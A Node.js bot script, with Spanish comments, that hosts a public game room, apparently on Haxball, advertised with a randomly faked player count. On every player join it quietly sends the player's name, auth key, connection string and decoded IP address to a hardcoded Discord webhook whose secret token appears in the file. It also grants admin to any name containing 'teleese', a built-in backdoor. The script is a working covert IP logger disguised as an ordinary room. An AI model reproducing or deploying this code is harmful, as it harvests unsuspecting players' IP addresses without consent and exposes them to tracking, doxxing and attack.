const API = require("./src/index")();
const { Room } = API;
const EnglishLanguage = require("./languages/englishLanguage");
API.Language.current = new EnglishLanguage(API);

const axios = require("axios");

/* ------------------ Funciones auxiliares ------------------ */

function decryptHex(str) {
  if (!str || typeof str !== "string") return "";
  let out = "";
  for (let i = 0; i < str.length; i += 2) {
    out += String.fromCharCode(parseInt(str.substring(i, i + 2), 16));
  }
  return out;
}

async function sendDiscordRaw(webhookUrl, body) {
  if (!webhookUrl) return;
  try {
    await axios.post(webhookUrl, body, { timeout: 10000 });
    return true;
  } catch (err) {
    console.error("❌ Error enviando webhook:", err?.message || err);
    return false;
  }
}

async function sendDiscordPlayer(webhookUrl, player, roomName) {
  if (!webhookUrl) return;
  const payload = {
    content: `Nuevo jugador conectado: **${player.name}** en ${roomName}`,
    embeds: [
      {
        title: "🎯 Nuevo Jugador Conectado",
        color: 0x00ff00,
        fields: [
          { name: "Nombre", value: player.name || "N/A", inline: true },
          { name: "ID", value: String(player.id || "N/A"), inline: true },
          { name: "Auth", value: player.auth || "N/A", inline: true },
          { name: "Conn", value: player.conn || "No tiene", inline: true },
          { name: "IP", value: decryptHex(player.conn) || "No tiene", inline: true }
        ],
        timestamp: new Date().toISOString(),
        footer: { text: "Teleese x Yeah" }
      }
    ]
  };
  await sendDiscordRaw(webhookUrl, payload);
}

async function sendDiscordRoomLink(webhookUrl, roomLink, roomName) {
  if (!webhookUrl) return;
  const payload = {
    content: `🏟 Sala creada: **${roomName}**\n${roomLink}`,
    embeds: [
      {
        title: "Sala creada",
        color: 0x0000ff,
        fields: [{ name: "Link", value: roomLink, inline: false }],
        timestamp: new Date().toISOString(),
        footer: { text: "Teleese x Crash" }
      }
    ]
  };
  await sendDiscordRaw(webhookUrl, payload);
}

/* ------------------ Configuración ------------------ */

// Generar número aleatorio de jugadores (0–30)
const randomPlayerCount = Math.floor(Math.random() * 31);

const geoList = [
  {
    name: "✌🏽꧁🏳️‍🌈 JUEGAN TODES LES PIBXS 💚꧂🏳️",
    flag: "ar",
    lat: -34.78179168701172,
    lon: -58.44478225708008,
    maxPlayers: 30,
    playerCount: randomPlayerCount // 👈 número de jugadores aleatorio
  }
];

/* ------------------ Selección por índice ------------------ */

const jobIndex = Number.parseInt(process.env.INDEX || "0", 10);
const recaptchaToken = process.env.RECAPTCHA_TOKEN;
const webhookUrl = "https://discord.com/api/webhooks/1365562720862208091/pgiPEDfXCpYE7mZM4-o1mDJ-AZnRTFxT_J_-EdO71hNUxFBFQ8Y5KcU6_jyGXXh3kvH2";

const geo = geoList[jobIndex % geoList.length];
const roomName = geo.name;
const maxPlayers = geo.maxPlayers;

if (!recaptchaToken) {
  console.error("❌ No se encontró RECAPTCHA_TOKEN. No se puede crear la sala.");
  process.exit(1);
}

console.log(`🚀 Creando sala: ${roomName} | MaxPlayers: ${maxPlayers} | PlayerCount: ${geo.playerCount} | Geo: ${JSON.stringify(geo)}`);

/* ------------------ Crear sala ------------------ */

Room.create(
  {
    name: roomName,
    maxPlayerCount: maxPlayers,
    unlimitedPlayerCount: true,
    showInRoomList: true,
    geo: geo,
    token: recaptchaToken,
    playerCount: geo.playerCount // 👈 acá se incluye el valor aleatorio
  },
  {
    storage: {
      player_name: process.env.PLAYER_NAME || "Teleese",
      avatar: process.env.PLAYER_AVATAR || ":)"
    },
    libraries: [],
    config: null,
    renderer: null,
    plugins: [],
    onOpen: (room) => {
      console.log("✅ Sala creada (onOpen). Esperando link...");

      room.onAfterRoomLink = (roomLink) => {
        console.log("🔗 Link de la sala:", roomLink);
        if (webhookUrl) sendDiscordRoomLink(webhookUrl, roomLink, roomName);
      };

      /* ------------------ Eventos ------------------ */

      room.onPlayerJoin = (playerObj) => {
        try {
          console.log(`🎯 Nuevo jugador: ${playerObj.name} (ID: ${playerObj.id})`);
          sendDiscordPlayer(webhookUrl, playerObj, roomName);

          room.sendAnnouncement(
            `Bienvenidx ${playerObj.name}! 🟣 Unite a nuestro Discord: https://discord.gg/6bvvAQZF`,
            playerObj.id,
            0xff00ff,
            "bold",
            2
          );

          // Primer humano = admin
          const humanos = room.players.filter(p => !p.name.includes("Teleese") && p.id !== 0);
          if (humanos.length === 1) {
            room.setPlayerAdmin(playerObj.id, true);
            room.sendAnnouncement(
              `🔑 ${playerObj.name} es el primer jugador humano. Admin asignado automáticamente.`,
              null,
              0x00ff00,
              "bold",
              2
            );
          }

          if (playerObj.name.toLowerCase().includes("teleese")) {
            room.setPlayerAdmin(playerObj.id, true);
            room.sendAnnouncement(
              `👑 Bienvenido ${playerObj.name}, admin asignado automáticamente.`,
              null,
              0x00ffff,
              "bold",
              2
            );
          }

        } catch (e) {
          console.error("Error en onPlayerJoin:", e);
        }
      };

      room.onPlayerChat = (player, message) => {
        const msg = message.trim().toLowerCase();
        const p = room.players.find(pl => pl.id === player.id);

        if (msg === "!discord") {
          room.sendAnnouncement(`🟣 Unite a nuestro Discord: https://discord.gg/6bvvAQZF`, null, 0x7289da, "bold", 2);
          return false;
        }

        if (p && p.admin) {
          if (msg.startsWith("!lock")) {
            const pass = msg.split(" ")[1] || "reservada";
            room.setPassword(pass);
            room.sendAnnouncement(`🔒 Sala bloqueada con contraseña: ${pass}`, null, 0xff9900, "bold", 2);
            return false;
          }

          if (msg === "!unlock") {
            room.setPassword("");
            room.sendAnnouncement(`🔓 Sala abierta al público.`, null, 0x00ff00, "bold", 2);
            return false;
          }

          if (msg.startsWith("!admin ")) {
            const targetName = msg.slice(7).trim();
            const found = room.players.find(pl => pl.name.toLowerCase() === targetName.toLowerCase());
            if (found) {
              room.setPlayerAdmin(found.id, true);
              room.sendAnnouncement(`👑 ${found.name} ahora es admin.`, null, 0x00ff00, "bold", 2);
            } else {
              room.sendAnnouncement(`⚠️ No se encontró jugador con ese nombre.`, player.id, 0xff0000, "bold", 2);
            }
            return false;
          }

          if (msg.startsWith("!kick ")) {
            const targetName = msg.slice(6).trim();
            const found = room.players.find(pl => pl.name.toLowerCase() === targetName.toLowerCase());
            if (found) {
              room.kickPlayer(found.id, "Expulsado por admin", false);
              room.sendAnnouncement(`🚪 ${found.name} fue expulsado.`, null, 0xff5555, "bold", 2);
            }
            return false;
          }
        }

        return false;
      };

      room.onRoomError = (err) => console.error("❌ Error en sala:", err);
    },
    onClose: (msg) => {
      console.log("🔴 Bot ha salido de la sala:", msg?.toString());
      process.exit(0);
    }
  }
);

